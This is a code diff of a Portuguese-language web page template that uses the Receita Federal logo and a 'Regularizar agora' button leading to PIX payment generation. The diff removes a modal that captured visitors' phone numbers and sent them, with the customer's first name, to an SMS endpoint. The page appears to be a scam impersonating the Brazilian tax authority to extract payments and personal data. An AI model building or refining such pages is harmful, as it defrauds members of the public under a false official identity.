@@ -866,89 +866,13 @@
         }
 
         // Adicionar evento de clique no botão "Regularizar agora"
-        document.querySelector('.regularize-button').addEventListener('click', showPhoneModal);
+        document.querySelector('.regularize-button').addEventListener('click', generatePayment);
 
         // Fechar modal ao clicar fora
         window.onclick = function(event) {
-            const paymentModal = document.getElementById('paymentModal');
-            const phoneModal = document.getElementById('phoneModal');
-            if (event.target == paymentModal) {
-                paymentModal.style.display = 'none';
-            }
-            if (event.target == phoneModal) {
-                phoneModal.style.display = 'none';
-            }
-        }
-
-        // Função para mostrar modal de telefone
-        function showPhoneModal() {
-            document.getElementById('phoneModal').style.display = 'block';
-        }
-
-        // Função para formatar telefone
-        function formatPhone(value) {
-            const numbers = value.replace(/\D/g, '');
-            if (numbers.length <= 2) return numbers;
-            if (numbers.length <= 7) return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`;
-            return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`;
-        }
-
-        // Adicionar formatação ao campo de telefone
-        document.addEventListener('DOMContentLoaded', function() {
-            const phoneInput = document.getElementById('phoneInput');
-            if (phoneInput) {
-                phoneInput.addEventListener('input', function(e) {
-                    e.target.value = formatPhone(e.target.value);
-                });
-            }
-        });
-
-        // Função para enviar telefone e SMS
-        async function submitPhone() {
-            const phoneInput = document.getElementById('phoneInput');
-            const phone = phoneInput.value.replace(/\D/g, '');
-            
-            if (phone.length < 10) {
-                alert('Por favor, insira um número de telefone válido');
-                return;
-            }
-
-            try {
-                // Enviar SMS
-                const customerName = '{{ customer.nome.split()[0] if customer else "Cliente" }}';
-                await sendSMS(phone, customerName);
-                
-                // Fechar modal de telefone e abrir modal de pagamento
-                document.getElementById('phoneModal').style.display = 'none';
-                generatePayment();
-            } catch (error) {
-                console.error('Erro ao enviar SMS:', error);
-                // Mesmo se o SMS falhar, continuar com o PIX
-                document.getElementById('phoneModal').style.display = 'none';
-                generatePayment();
-            }
-        }
-
-        // Função para enviar SMS
-        async function sendSMS(phone, customerName) {
-            try {
-                const response = await fetch('/send-sms', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        phone: phone,
-                        customer_name: customerName
-                    })
-                });
-
-                const data = await response.json();
-                if (!data.success) {
-                    console.warn('SMS não enviado:', data.error);
-                }
-            } catch (error) {
-                console.warn('Erro ao enviar SMS:', error);
+            const modal = document.getElementById('paymentModal');
+            if (event.target == modal) {
+                modal.style.display = 'none';
             }
         }
 
@@ -961,28 +885,6 @@
             }
         }
     </script>
-
-    <!-- Modal de Telefone -->
-    <div id="phoneModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <img src="https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais/remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png" alt="Logo Receita Federal" class="modal-logo">
-            </div>
-            <div class="phone-form-container">
-                <h3 style="color: #003472; margin-bottom: 20px; text-align: center;">Atualização de Cadastro</h3>
-                <p style="margin-bottom: 20px; text-align: center; color: #666;">Para prosseguir com a regularização, confirme seu número de telefone:</p>
-                <div class="phone-input-group">
-                    <label for="phoneInput" style="display: block; margin-bottom: 8px; font-weight: 600; color: #003472;">Telefone (com DDD):</label>
-                    <input type="tel" id="phoneInput" inputmode="numeric" placeholder="(11) 99999-9999" 
-                           style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; text-align: center;"
-                           maxlength="15" required>
-                </div>
-                <button onclick="submitPhone()" class="phone-continue-button" style="width: 100%; padding: 12px; background: #28a745; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; margin-top: 20px; cursor: pointer;">
-                    Continuar
-                </button>
-            </div>
-        </div>
-    </div>
 
     <!-- Modal de Pagamento -->
     <div id="paymentModal" class="modal">
